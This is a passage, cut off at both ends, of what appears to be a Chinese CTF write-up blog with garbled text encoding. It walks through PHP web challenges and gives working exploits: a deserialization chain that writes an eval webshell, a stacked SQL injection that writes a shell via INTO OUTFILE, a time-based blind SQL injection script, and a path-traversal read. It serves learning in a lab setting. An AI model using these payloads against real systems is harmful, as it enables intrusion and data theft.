class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†™ä¸€ä¸‹ç»•è¿‡æ­»äº¡exitçš„æ–¹æ³•ï¼Œä½¿ç”¨base64è§£ç <code>&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n</code>è¿™ä¸ªå­—ç¬¦ä¸²ä¸­çœŸæ­£ä¼šè¢«base64è§£ç è¯†åˆ«åˆ°çš„å†…å®¹å®é™…ä¸Šæ˜¯<code>php12ä½é•¿åº¦çš„æ•°å­—exit</code>è€Œbase64åˆæ˜¯ä»¥4ä¸ªå­—èŠ‚ä¸ºä¸€ç»„æ¥è¿›è¡Œè§£ç çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬dataä¸­çš„å†…å®¹å°±æ˜¯éšä¾¿ä¸€ä¸ªå•å­—ç¬¦åŠ ä¸Šä¸€å¥è¯æœ¨é©¬base64ç¼–ç åçš„å†…å®¹å³å¯</p><p>æœ€ç»ˆæ„é€ å‡ºçš„é“¾å­å°±æ˜¯è§¦å‘Aç±»é”€æ¯å¼•å¯¼Bç±»setå‡½æ•°æ‰§è¡Œ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//exp.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token comment">//æ–‡ä»¶çš„name</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span><span class="token comment">//æ— æ‰€è°“å…¶å®</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xxx"</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["kkk"]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'base64_decode'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource='</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p>PHPæœ€æ–°ç‰ˆçš„å°Trickï¼Œ require_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶onceçš„hashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h2><p>å…ˆæ‰”ä¸€ä¸ªexp</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;&#125;$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;$a&#x3D;new Error($str,1);$b&#x3D;new Error($str,2);$c &#x3D; new SYCLOVER();$c-&gt;syc &#x3D; $a;$c-&gt;lover &#x3D; $b;echo urlencode(serialize($c));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>æ³¨å†Œç™»å½•ï¼Œåœ¨å¤´åƒå¤„ä¼¼ä¹æœ‰æ–‡ä»¶ä¸Šä¼ </p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020934705.png"></p><p>ä¸Šä¼ åå‘ç°ä»»ä½•æ–‡ä»¶éƒ½è¢«é‡å‘½åä¸ºjpgæ ¼å¼</p><p>ç”¨æˆ·ä¿¡æ¯å¤„æœ‰sqlæ³¨å…¥ç‚¹ï¼Œå¯ä½¿ç”¨å †å æ³¨å…¥</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020935563.png"></p><p>è¿‡æ»¤äº†å¤§é‡å…³é”®å­—ï¼Œç”¨è®¾å®šè¯­å¥å˜é‡ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">str&#x3D;&quot;select &#39;&lt;?php eval($_POST[kkk]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;len_str&#x3D;len(str)for i in range(0,len_str):if i &#x3D;&#x3D; 0:print(&#39;char(%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)else:print(&#39;,%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)print(&#39;)&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ å†™shell payloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">2;set @a&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,107,107,107,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @a;execute query;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>RCEæ‹¿flag</p><h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>SQLæ³¨å…¥ï¼Œåœ¨usernameå¤„æ”¾å…¥å•å¼•å·æŠ¥é”™ï¼Œä½†æ˜¯å†åŠ ä¸Š;å°±èƒ½æ‰§è¡Œï¼Œè¯´æ˜å­˜åœ¨å †å æ³¨å…¥ï¼Œå…ˆæ„é€ å†™shellè¯­å¥å‘ç°æ— æ³•å†™å…¥ï¼Œæ‰€ä»¥æ„é€ å¸ƒå°”æ³¨å…¥è¯­å¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> time<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span><span class="token punctuation">:</span>    by <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>strings<span class="token punctuation">,</span> <span class="token string">'UTF-8'</span><span class="token punctuation">)</span>  <span class="token comment"># å…ˆå°†è¾“å…¥çš„å­—ç¬¦ä¸²è½¬åŒ–æˆå­—èŠ‚ç </span>    hexstring <span class="token operator">=</span> by<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hexstringurl <span class="token operator">=</span> <span class="token string">"http://b28f3ae7-5844-4587-9d21-69687f9fc61d.node4.buuoj.cn:81/index.php?r=Login/Login"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    low <span class="token operator">=</span> <span class="token number">32</span>    high <span class="token operator">=</span> <span class="token number">128</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> low <span class="token operator">&lt;</span> high<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"select if(ascii(substr((select flag from flag),&#123;&#125;,1))>&#123;&#125;,sleep(2),0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        zpayload <span class="token operator">=</span> <span class="token string">"1';set @a=0x&#123;&#125;;prepare b from @a;execute b;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str_to_hex<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> zpayload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'111'</span>        <span class="token punctuation">&#125;</span>        datas <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        time1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>datas<span class="token punctuation">)</span>        time2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        times <span class="token operator">=</span> time2 <span class="token operator">-</span> time1        <span class="token keyword">if</span> times <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> high<span class="token punctuation">,</span> times<span class="token punctuation">)</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">if</span> mid <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·‘å‡ºä¸€ä¸ªæ–‡ä»¶åï¼Œä¸‹è½½æŸ¥çœ‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">///Common/fun.php</span><span class="token comment">// è·¯ç”±æ§åˆ¶è·³è½¬è‡³æ§åˆ¶å™¨</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$controller</span><span class="token punctuation">&#125;</span></span>Controller"</span><span class="token punctuation">;</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"action<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$action</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"actionIndex"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"LoginController"</span><span class="token punctuation">;</span>        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"actionIndex"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location:index.php?r=Login/Index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">/Controller/BaseController<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//æ‰€æœ‰æ§åˆ¶å™¨çš„çˆ¶ç±»</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">BaseController</span><span class="token punctuation">&#123;</span><span class="token comment">/* * åŠ è½½è§†å›¾æ–‡ä»¶ * viewName è§†å›¾åç§° * viewData è§†å›¾åˆ†é…æ•°æ®*/</span><span class="token keyword">private</span> <span class="token variable">$viewPath</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">loadView</span><span class="token punctuation">(</span><span class="token variable">$viewName</span> <span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">viewPath</span> <span class="token operator">=</span> <span class="token constant">BASE_PATH</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/View/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$viewName</span><span class="token punctuation">&#125;</span></span>.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">viewPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$viewData</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†æ•°ç»„ä¸­çš„å†…å®¹å˜ä¸ºå˜é‡</span><span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">viewPath</span><span class="token punctuation">;</span><span class="token comment">//åŒ…å«æ¸²æŸ“æ¨¡ç‰ˆ</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">///View/userIndex<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$img_file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/../favicon.ico'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$img_dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span><span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="'</span> <span class="token operator">.</span> <span class="token variable">$img_base64</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">'</span><span class="token punctuation">;</span>       <span class="token comment">//ä»»æ„æ–‡ä»¶base64ç¼–ç </span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®¡è®¡å®Œpayloadå°±å‡ºæ¥äº†</p><pre class="line-numbers language-none"><code class="language-none">?r&#x3D;User&#x2F;Index&amp;img_file&#x3D;&#x2F;..&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å›¾ç‰‡å¤„è¯»base64è§£ç å³å¯</p><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>æˆ‘tmè¯•äº†åŠå¤©ä½ å‘Šè¯‰æˆ‘å¼±å£ä»¤ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ/</p><p><code>admin/password</code><br><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206021103197.png"></p><p>æ˜æ˜¾çš„æ–‡ä»¶è¯»å–ï¼Œä¼ªåè®®è¯»å–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//upload.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Uploader</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/uploads/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>                <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>                @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"echo '&lt;br>&lt;br>Master, I want to study rizhan!&lt;br>&lt;br>';"</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>                <span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[^a-z0-9]"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('illegal filename!');"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('you are too big (â€²â–½`ã€ƒ)');"</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"move_uploaded_file('"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>                <span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>                <span class="token comment">// return $sandbox.$this->Filename.$ext;</span>                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span 